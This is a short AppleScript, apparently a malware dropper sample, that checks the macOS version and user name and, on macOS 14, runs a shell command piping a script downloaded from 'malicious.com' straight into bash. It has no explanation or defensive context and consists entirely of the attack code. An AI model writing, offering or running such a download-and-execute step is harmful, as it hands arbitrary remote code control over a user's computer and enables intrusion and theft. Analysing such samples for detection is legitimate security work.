set user to short user name of (system info)
set sysver to system version of (system info)

if sysver starts with "14." then
	do shell script "curl http://malicious.com/payload14.sh | bash"
else
	display dialog "Unsupported macOS version"
end if
